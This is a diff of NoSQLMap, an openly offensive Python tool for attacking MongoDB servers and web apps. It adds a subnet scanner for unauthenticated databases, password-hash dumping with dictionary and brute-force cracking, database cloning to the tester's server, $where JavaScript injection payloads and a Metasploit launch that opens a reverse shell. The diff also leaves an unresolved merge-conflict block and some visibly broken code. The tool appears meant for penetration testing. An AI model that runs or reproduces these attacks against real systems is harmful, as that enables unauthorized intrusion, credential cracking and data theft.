@@ -30,11 +30,14 @@ import ipcalc
 import signal
 import ast
 import datetime
+import itertools
+import re
 from hashlib import md5
+from threading import Thread
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
-optionSet = [False,False,False,False,False,False,False,False]
+optionSet = [False,False,False,False,False,False,False,False,False]
 global yes_tag
 global no_tag
 yes_tag = ['y', 'Y']
@@ -43,9 +46,13 @@ global victim
 global webPort
 global uri
 global httpMethod
+global https
 global myIP
 global myPort
 global verb
+global scanNeedCreds
+global dbPort
+dbPort = 27017
 
 def mainMenu():
 	mmSelect = True
@@ -60,7 +67,11 @@ def mainMenu():
 		print "| |\  | (_) /\__/ /\ \/' / |____| |  | | (_| | |_) |"
 		print "\_| \_/\___/\____/  \_/\_\_____/\_|  |_/\__,_| .__/"
 		print "===================================================="
+<<<<<<< HEAD
 		print "NoSQLMap-v0.31"
+=======
+		print "NoSQLMap-v0.4"
+>>>>>>> 0.4
 		print "nosqlmap@gmail.com"
 		print "\n"
 		print "1-Set options"
@@ -110,6 +121,7 @@ def options():
 	global victim
 	global webPort
 	global uri
+	global https
 	global httpMethod
 	global postData
 	global myIP
@@ -140,9 +152,10 @@ def options():
 		myPort = "Not Set"
 	if optionSet[6] == False:
 		verb = "OFF"
-	if optionSet[7] == False:
-		dbPort = 27017
-	optSelect = True
+		optSelect = True
+	if optionSet[8] == False:
+		https = "OFF"
+		optSelect = True
 	
 	while optSelect:	
 		print "\n\n"
@@ -150,14 +163,15 @@ def options():
 		print "1-Set target host/IP (Current: " + str(victim) + ")"
 		print "2-Set web app port (Current: " + str(webPort) + ")" 
 		print "3-Set App Path (Current: " + str(uri) + ")"
-		print "4-Set MongoDB Port (Current : " + str(dbPort) + ")"
-		print "5-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
-		print "6-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
-		print "7-Set shell listener port (Current: " + str(myPort) + ")"
-		print "8-Toggle Verbose Mode: (Current: " + str(verb) + ")"
-		print "9-Load options file"
-		print "0-Load options from saved Burp request"
-		print "a-Save options file"
+		print "4-Toggle HTTPS (Current: " + str(https) + ")"
+		print "5-Set MongoDB Port (Current : " + str(dbPort) + ")"
+		print "6-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
+		print "7-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
+		print "8-Set shell listener port (Current: " + str(myPort) + ")"
+		print "9-Toggle Verbose Mode: (Current: " + str(verb) + ")"
+		print "0-Load options file"
+		print "a-Load options from saved Burp request"
+		print "b-Save options file"
 		print "x-Back to main menu"
 
 		select = raw_input("Select an option: ")
@@ -205,13 +219,25 @@ def options():
 			uri = raw_input("Enter URI Path (Press enter for no URI): ")
 			print "\nURI Path set to " + uri + "\n"
 			optionSet[2] = True
-		
+			
 		elif select == "4":
+			if https == "OFF":
+				print "HTTPS enabled."
+				https = "ON"
+				optionSet[8] = True
+			
+			elif verb == "ON":
+				print "HTTPS disabled."
+				https = "OFF"
+				optionSet[8] = True
+			
+		
+		elif select == "5":
 			dbPort = int(raw_input("Enter target MongoDB port: "))
 			print "\nTarget Mongo Port set to " + str(dbPort) + "\n"
 			optionSet[7] = True
 
-		elif select == "5":
+		elif select == "6":
 			httpMethod = True
 			while httpMethod == True:
 
@@ -236,7 +262,7 @@ def options():
 				else:
 					print "Invalid selection"
 
-		elif select == "6":
+		elif select == "7":
 			#Unset the setting boolean since we're setting it again.
 			optionSet[4] = False
 			goodLen = False
@@ -268,12 +294,12 @@ def options():
 					print "\nShell/DB listener set to " + myIP + "\n"
 					optionSet[4] = True
 		
-		elif select == "7":
+		elif select == "8":
 			myPort = raw_input("Enter TCP listener for shells: ")
 			print "Shell TCP listener set to " + myPort + "\n"
 			optionSet[5] = True
 		
-		elif select == "8":
+		elif select == "9":
 			if verb == "OFF":
 				print "Verbose output enabled."
 				verb = "ON"
@@ -284,7 +310,7 @@ def options():
 				verb = "OFF"
 				optionSet[6] = True
 			
-		elif select == "9":
+		elif select == "0":
 			loadPath = raw_input("Enter file name to load: ")
 			try:
 				fo = open(loadPath,"r" )
@@ -310,7 +336,7 @@ def options():
 			except:
 				print "Couldn't load options file!"
 		
-		elif select == "0":
+		elif select == "a":
 			loadPath = raw_input("Enter path to Burp request file: ")
 
 			try:
@@ -349,7 +375,7 @@ def options():
 			uri = methodPath[1].replace("\r\n","")
 			optionSet[2] = True			
 			
-		elif select == "a":
+		elif select == "b":
 			savePath = raw_input("Enter file name to save: ")
 			try:
 				fo = open(savePath, "wb")
@@ -370,35 +396,42 @@ def netAttacks(target):
 	print "================="
 	mgtOpen = False
 	webOpen = False
+	mgtSelect = True
 	#This is a global for future use with other modules; may change
 	global dbList
 	global dbPort
 	dbList = []
 	
-	srvNeedCreds = raw_input("Does the database server need credentials (y/n)? ")
+	print "Checking to see if credentials are needed..."
+	needCreds = accessCheck(target,dbPort,False)
 	
-	if srvNeedCreds in no_tag:
-		
-		try:
-			conn = pymongo.MongoClient(target,dbPort)
-			print "MongoDB port open on " + target + ":" + str(dbPort)
-			mgtOpen = True
+	if needCreds[0] == 0:
+		conn = pymongo.MongoClient(target,dbPort)
+		print "Successful access with no credentials!"
+		mgtOpen = True
 	
-		except:
-			print "MongoDB port closed."					
-	
-	elif srvNeedCreds in yes_tag:
+	elif needCreds[0] == 1:
+		print "Login required!"
 		srvUser = raw_input("Enter server username: ")
 		srvPass = raw_input("Enter server password: ")
-		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
-
+		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
+		
 		try:
-			conn = pymongo.MongoClient(uri)
+			conn = pymongo.MongoClient(target)
 			print "MongoDB authenticated on " + target + ":27017!"
 			mgtOpen = True
 		except:
 			raw_input("Failed to authenticate.  Press enter to continue...")
 			return
+	
+	elif needCreds[0] == 2:
+		conn = pymongo.MongoClient(target,dbPort)
+		print "Access check failure.  Testing will continue but will be unreliable."
+		mgtOpen = True
+	
+	elif needCreds[0] == 3:
+		print "Couldn't connect to Mongo server."
+		return
 	
 	
 	mgtUrl = "http://" + target + ":28017"	
@@ -425,101 +458,125 @@ def netAttacks(target):
 					dbTemp= dbs['databases'][x]['name']
 					print str(menuItem) + "-" + dbTemp
 					menuItem += 1
+			else:
+				print "REST interface not enabled."
 			print "\n"
 
-		else:
-			print "REST interface not enabled." 
-			
-	except:
-		
+	except:		
 		print "MongoDB web management closed or requires authentication."	
 		
-	print "\n"
 	if mgtOpen == True:
-		print "Server Info:"
-		mongoVer = conn.server_info()['version']
-		print "MongoDB Version: " + mongoVer
-		mongoDebug = conn.server_info()['debug']
-		print "Debugs enabled : " + str(mongoDebug)
-		mongoPlatform = conn.server_info()['bits']
-		print "Platform: " + str(mongoPlatform) + " bit"
-		print "\n"
 		
-		try:
-			print "List of databases:"
-			dbList = conn.database_names()
-			print "\n".join(dbList)
+		while mgtSelect:
 			print "\n"
-			
-		except:
-			print "Error:  Couldn't list databases.  The provided credentials may not have rights."
-		
-		print "List of collections:"
-		#print "\n"
-		
-		try:
-			for dbItem in dbList:
-				db = conn[dbItem]
-				colls = db.collection_names()
-				print dbItem + ":"
-				print "\n".join(colls)
+			print "1-Get Server Version and Platform"
+			print "2-Enumerate Databases/Collections/Users"
+			print "3-Check for GridFS"
+			print "4-Clone a Database"
+			print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
+			print "6-Return to Main Menu"
+			attack = raw_input("Select an attack: ")
+	
+			if attack == "1":
 				print "\n"
+				getPlatInfo(conn)
+			
+			if attack == "2":
+				print "\n"
+				enumDbs(conn)
+			
+			if attack == "3":
+				print "\n"
+				enumGrid(conn)
+			
+			if attack == "4":
+				print "\n"
+				stealDBs(myIP,conn)
+			
+			if attack == "5":
+				print "\n"
+				msfLaunch()
+			
+			if attack == "6":
+				return
+			
+			
 				
-				if 'system.users' in colls:
-					users = list(db.system.users.find())
-					print "Database Users and Password Hashes:"
-					
-					for x in range (0,len(users)):
-						print "Username: " + users[x]['user']
-						print "Hash: " + users[x]['pwd']
-						print "\n"
-						crack = raw_input("Crack this hash (y/n)? ")
-						
-						if crack in yes_tag:
-							brute_pass(users[x]['user'],users[x]['pwd'])
-					
-		except:
-			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
-		
-		print "\n"
-		#Start GridFS enumeration
-		
-		testGrid = raw_input("Check for GridFS (y/n)? ")
-		
-		if testGrid in yes_tag:
-			try:
-				for dbItem in dbList:
-					try:
-						db = conn[dbItem]
-						fs = gridfs.GridFS(db)
-						files = fs.list()
-						print "GridFS enabled on database " + str(dbItem)
-						print " list of files:"
-						print "\n".join(files)
-					
-					except:
-						print "GridFS not enabled on " + str(dbItem) + "."
-			except:
-				print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
-							
-		stealDB = raw_input("Steal a database (y/n-Requires your own Mongo server)?: ")
-		
-		if stealDB in yes_tag:
-			stealDBs (myIP)
-			
-		getShell = raw_input("Try to get a shell? (y/n-Requrires mongoDB <2.2.4)? ")
-		
-		if getShell in yes_tag:
-			#Launch Metasploit exploit
-			try:
-				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
-			
-			except:
-				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
-	raw_input("Press enter to continue...")
-	return()
-		
+def getPlatInfo (mongoConn):
+	print "Server Info:"
+	print "MongoDB Version: " + mongoConn.server_info()['version']
+	print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
+	print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
+	print "\n"
+	return
 
+def enumDbs (mongoConn):
+	try:
+		print "List of databases:"
+		print "\n".join(mongoConn.database_names())
+		print "\n"
+			
+	except:
+		print "Error:  Couldn't list databases.  The provided credentials may not have rights."
+	
+	print "List of collections:"
+		
+	try:
+		for dbItem in mongoConn.database_names():
+			db = mongoConn[dbItem]
+			print dbItem + ":"
+			print "\n".join(db.collection_names())
+			print "\n"
+				
+			if 'system.users' in db.collection_names():
+				users = list(db.system.users.find())
+				print "Database Users and Password Hashes:"
+					
+				for x in range (0,len(users)):
+					print "Username: " + users[x]['user']
+					print "Hash: " + users[x]['pwd']
+					print "\n"
+					crack = raw_input("Crack this hash (y/n)? ")
+						
+					if crack in yes_tag:
+						passCrack(users[x]['user'],users[x]['pwd'])
+					
+	except:
+		print "Error:  Couldn't list collections.  The provided credentials may not have rights."
+		
+	print "\n"
+	return
+
+def enumGrid (mongoConn):
+	try:
+		for dbItem in mongoConn.database_names():
+			try:
+				db = mongoConn[dbItem]
+				fs = gridfs.GridFS(db)
+				files = fs.list()
+				print "GridFS enabled on database " + str(dbItem)
+				print " list of files:"
+				print "\n".join(files)
+					
+			except:
+				print "GridFS not enabled on " + str(dbItem) + "."
+			
+	except:
+		print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
+							
+	return
+
+			
+def msfLaunch():			
+	try:
+		proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
+			
+	except:
+		print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
+	raw_input("Press enter to continue...")
+	return
+		
+	
 def postApps():
 	print "Web App Attacks (POST)"
 	print "==============="
@@ -543,7 +600,11 @@ def postApps():
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
-	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	if https == "OFF":
+		appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	
+	elif https == "ON":
+		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 	
 	try:
 		body = urllib.urlencode(postData)
@@ -625,9 +686,15 @@ def postApps():
 		else:
 			print "Test 1: PHP associative array injection"
 
-		injLen = int(len(urllib2.urlopen(req).read()))			
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))			
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum +=1
 		print "\n"
 		
 		#Delete the extra key
@@ -642,9 +709,15 @@ def postApps():
 		else:
 			print "Test 2: $where injection (string escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
+		
 		print "\n"
 		
 		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
@@ -656,9 +729,14 @@ def postApps():
 		else:
 			print "Test 3: $where injection (integer escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 		print "\n"
 
 		#Start a single record attack in case the app expects only one record back
@@ -672,9 +750,15 @@ def postApps():
 		else:
 			print "Test 4: $where injection string escape (single record)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		print "\n"
 		
 		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
@@ -687,9 +771,15 @@ def postApps():
 		else:
 			print "Test 5: $where injection integer escape (single record)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		print "\n"
 		
 		postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
@@ -703,11 +793,16 @@ def postApps():
 		else:
 			print "Test 6: This != injection (string escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
-		print "\n"
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+			print "\n"
+		else:
+			testNum += 1
+			
 		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -718,9 +813,15 @@ def postApps():
 		else:
 			print "Test 7:  This != injection (integer escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		print "\n"
 		
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
@@ -842,8 +943,11 @@ def getApps():
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
-	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	if https == "OFF":
+		appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
 	
+	elif https == "ON":
+		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 	try:
 		appRespCode = urllib.urlopen(appURL).getcode()
 		if appRespCode == 200:
@@ -895,31 +999,53 @@ def getApps():
 			print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
 		else:
 			print "Test 1: PHP associative array injection"
-		injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
-		print "\n"
+			
+		#Test for errors returned by injection
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[1]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 
+		print "\n"
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
 			print "Injecting " + uriArray[2]
 		else:
 			print "Test 2: $where injection (string escape)"
 		
-		injLen = int(len(urllib.urlopen(uriArray[2]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[2]).read()),testNum)
+		
+			
+		if errorCheck == False:		
+			injLen = int(len(urllib.urlopen(uriArray[2]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		
 		print "\n"
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
 			print "Injecting " + uriArray[3]
 		else:
-			print "Test 3:  $where injection (integer escape)"	
+			print "Test 3:  $where injection (integer escape)"
 		
-		injLen = int(len(urllib.urlopen(uriArray[3]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum +=1
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[3]).read()),testNum)
+		
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[3]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum +=1
+		
+		else:
+			testNum +=1
 				
 		#Start a single record attack in case the app expects only one record back
 		print "\n"		
@@ -930,9 +1056,14 @@ def getApps():
 			print "Test 4: $where injection string escape (single record)"
 		
 		
-		injLen = int(len(urllib.urlopen(uriArray[4]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[4]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[4]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 				
 		print "\n"
 		if verb == "ON":
@@ -941,9 +1072,15 @@ def getApps():
 		else:
 			print "Test 5: $where injection integer escape (single record)"
 		
-		injLen = int(len(urllib.urlopen(uriArray[5]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum +=1
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[5]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[5]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum +=1
+		
+		else:
+			testNum += 1
 			
 		print "\n"
 		if verb == "ON":
@@ -951,9 +1088,15 @@ def getApps():
 			print " Injecting " + uriArray[6]
 		else:
 			print "Test 6: This != injection (string escape)"
-		injLen = int(len(urllib.urlopen(uriArray[6]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+			
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[6]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[6]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 			
 		print "\n"
 		if verb == "ON":
@@ -961,11 +1104,17 @@ def getApps():
 			print " Injecting " + uriArray[7]
 		else:
 			print "Test 7: This != injection (integer escape)"
-		injLen = int(len(urllib.urlopen(uriArray[7]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
-			
+		
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[7]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[7]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 		print "\n"
+		
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 		
 		if doTimeAttack in yes_tag:
@@ -1059,6 +1208,31 @@ def getApps():
 	raw_input("Press enter to continue...")
 	return()
 
+def errorTest (errorCheck,testNum):
+	global possAddrs
+	global httpMethod
+	global neDict
+	global postData
+	
+	if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
+		print "Injection returned a MongoDB Error.  Injection may be possible."
+		
+		if httpMethod == "GET":
+			possAddrs.append(uriArray[testNum])
+			return True
+		
+		else:
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+				return True
+			else:
+				possAddrs.appends(str(postData))
+				return True
+	else:
+		return False
+		
+	
+
 def checkResult(baseSize,respSize,testNum):
 	global vulnAddrs
 	global possAddrs
@@ -1114,6 +1288,7 @@ def checkResult(baseSize,respSize,testNum):
 		else:
 			print "Injection failed."
 		return
+	
 	else:
 		if verb == "ON":
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
@@ -1227,11 +1402,11 @@ def buildUri(origUri, randValue):
 			uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
 			uriArray[8] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 			uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy=\"!" + "&"
-			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
+			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
+			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
 			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
 			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
-			uriArray[14] += paramName[x] + "a'; return true; var dum=a'"
+			uriArray[14] += paramName[x] + "a'; return true; var dum='a"
 			uriArray[15] += paramName[x] + "1; return true; var dum=2"
 			#Add values that can be manipulated for database attacks
 			uriArray[16] += paramName[x] + "=a\'; ---"
@@ -1266,7 +1441,8 @@ def buildUri(origUri, randValue):
 
 	return uriArray[0]	
 	
-def stealDBs(myDB):
+def stealDBs(myDB,mongoConn):
+	dbList = mongoConn.database_names()
 	menuItem = 1
 	if optionSet[4] == False:
 		raw_input("No destination database set! Press enter to return to the main menu.")
@@ -1325,21 +1501,78 @@ def stealDBs(myDB):
 			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
 			return
 	
+def accessCheck(ip,port,pingIt):
+	
+	if pingIt == True:
+		test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")
+		
+		if test == 0:	
+			try:
+				conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
+		
+				try:
+					dbList = conn.database_names()
+					dbVer = conn.server_info()['version']
+					conn.disconnect()
+					return [0,dbVer]
+		
+				except:
+					if str(sys.exc_info()).find('need to login') != -1:
+						conn.disconnect()
+						return [1,None]
+			
+					else:
+						conn.disconnect()
+						return [2,None]
+
+			except:
+				return [3,None]
+		
+		else:
+			return [4,None]
+	else:
+		try:
+			conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
+		
+			try:
+				dbList = conn.database_names()
+				dbVer = conn.server_info()['version']
+				conn.disconnect()
+				return [0,dbVer]
+		
+			except:
+				if str(sys.exc_info()).find('need to login') != -1:
+					conn.disconnect()
+					return [1,None]
+			
+				else:
+					conn.disconnect()
+					return [2,None]
+
+		except:
+			return [3,None]	
+		
+
 def massMongo():
 	global victim
 	optCheck = True
 	loadCheck = False
+	ping = False
 	success = []
+	versions = []
+	creds = []
+	commError = []
 	ipList = []
 	print "\n"
 	print "MongoDB Default Access Scanner"
 	print "=============================="
 	print "1-Scan a subnet for default MongoDB access"
 	print "2-Loads IPs to scan from a file"
+	print "3-Enable/disable host pings before attempting connection"
 	print "x-Return to main menu"
 	
 	while optCheck:
-		loadOpt = raw_input("Select a scan method: ")
+		loadOpt = raw_input("Select an option: ")
 		
 		if loadOpt == "1":
 			subnet = raw_input("Enter subnet to scan: ")
@@ -1363,6 +1596,15 @@ def massMongo():
 					optCheck = False
 				except:
 					print "Couldn't open file."
+		
+		if loadOpt == "3":
+			if ping == False:
+				ping = True
+				print "Scan will ping host before connection attempt."
+			
+			elif ping == True:
+				ping = False
+				print "Scan will not ping host before connection attempt."
 					
 		if loadOpt == "x":
 			return
@@ -1370,25 +1612,61 @@ def massMongo():
 
 	print "\n"
 	for target in ipList:
-	        try:
-	                conn = pymongo.MongoClient(target,27017)
-			print "Connected to " + target
-			dbList = conn.database_names()
+		result = accessCheck(target.rstrip(),27017,ping)
 			
-			print "Successful default access on " + target
-			success.append(target)
-			conn.disconnect()
+		if result[0] == 0:
+			print "Successful default access on " + target.rstrip() + "(Mongo Version: " + result[1] + ")."
+			success.append(target.rstrip())
+			versions.append(result[1])
+			
+		elif result[0] == 1:
+			print "MongoDB running but credentials required on " + target.rstrip() + "."
+			creds.append(target.rstrip()) #Future use
+			
+		elif result[0] == 2:
+			print "Successful MongoDB connection to " + target.rstrip() + " but error executing command."
+			commError.append(target.rstrip()) #Future use
+		
+		elif result[0] == 3:
+			print "Couldn't connect to " + target.rstrip() + "."
+		
+		elif result[0] == 4:
+			print target.rstrip() + " didn't respond to ping."
 
-		except:
-		        print "Failed to connect to or need credentials for " + target 
-
-	print "\n\n"
-	print "Discovered MongoDB Servers:"
 	
-	menuItem = 1
+	print "\n\n"
+	select = True
+	while select:
+		saveEm = raw_input("Save scan results to CSV? (y/n):")
+		
+		if saveEm in yes_tag:
+			savePath = raw_input("Enter file name to save: ")
+			outCounter = 0
+			try:
+				fo = open(savePath, "wb")
+				for server in success:
+					fo.write(server + "," + versions[outCounter] + "\n" )
+					outCounter += 1				
+					
+				fo.close()
+				print "Scan results saved!"
+				select = False
+			except:
+				print "Couldn't save scan results."
+			
+		elif saveEm in no_tag:
+			select = False
+		else:
+			select = True
+			
+	print "Discovered MongoDB Servers with No Auth:"
+	print "IP" + " " + "Version"
+	
+	outCounter= 1
+	
 	for server in success:
-		print str(menuItem) + "-" + server
-		menuItem += 1
+		print str(outCounter) + "-" + server + " " + versions[outCounter - 1]
+		outCounter += 1
 	
 	select = True
 	print "\n"
@@ -1398,7 +1676,7 @@ def massMongo():
 		if select == "x" or select == "X":
 			return
 	
-		elif select.isdigit() == True:
+		elif select.isdigit() == True and int(select) <= outCounter:
 			victim = success[int(select) - 1]
 			optionSet[0] = True
 			raw_input("New target set! Press enter to return to the main menu.")
@@ -1406,11 +1684,37 @@ def massMongo():
 	
 		else:
 			raw_input("Invalid selection.")				
-	
-def gen_pass(user, passw):
-	return md5(user + ":mongo:" + str(passw)).hexdigest();
 
-def brute_pass(user,key):
+def passCrack (user, encPass):
+	select = True
+	print "Select password cracking method: "
+	print "1-Dictionary Attack"
+	print "2-Brute Force"
+	print "3-Exit"
+
+	
+	while select:
+		select = raw_input("Selection: ")
+		if select == "1":
+			select = False
+			dict_pass(user,encPass)
+		
+		elif select == "2":
+			select = False
+			brute_pass(user,encPass)
+		
+		elif select == "3":
+			return
+	return
+
+def gen_pass(user, passw, hashVal):
+	if md5(user + ":mongo:" + str(passw)).hexdigest() == hashVal:
+		print "Found - " + user + ":" + passw
+		return True
+	else:
+		return False
+
+def dict_pass(user,key):
 	loadCheck = False
 	
 	while loadCheck == False:
@@ -1425,14 +1729,54 @@ def brute_pass(user,key):
 	print "Running dictionary attack..."
 	for passGuess in passList:
 		temp = passGuess.split("\n")[0]
+		gotIt = gen_pass (user, temp, key)
 		
-		if gen_pass(user, temp) == key:
-			print "\nFound - "+user+":"+passGuess
-			return passGuess
-			
-	print "Password not found for "+user
-	return ""
+		if gotIt == True:
+			break
+	return
 
+def genBrute(chars, maxLen):
+    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))
+
+def brute_pass(user,key):
+	charSel = True
+	print "\n"
+	maxLen = raw_input("Enter the maximum password length to attempt: ")
+	print "1-Lower case letters"
+	print "2-Upper case letters"
+	print "3-Upper + lower case letters"
+	print "4-Numbers only"
+	print "5-Alphanumeric (upper and lower case)"
+	print "6-Alphanumeric + special characters"
+	charSel = raw_input("\nSelect character set to use:")
+	
+	if charSel == "1":
+		chainSet = string.ascii_lowercase
+
+	elif charSel == "2":
+		chainSet= string.ascii_uppercase
+	
+	elif charSel == "3":
+		chainSet = string.ascii_letters
+	
+	elif charSel == "4":
+		chainSet = string.digits
+	
+	elif charSel == "5":
+		chainSet = string.ascii_letters + string.digits
+	
+	elif charSel == "6":
+		chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
+	count = 0
+	print "\n",
+	for attempt in genBrute (chainSet,int(maxLen)):
+		print "\rCombinations tested: " + str(count) + "\r"
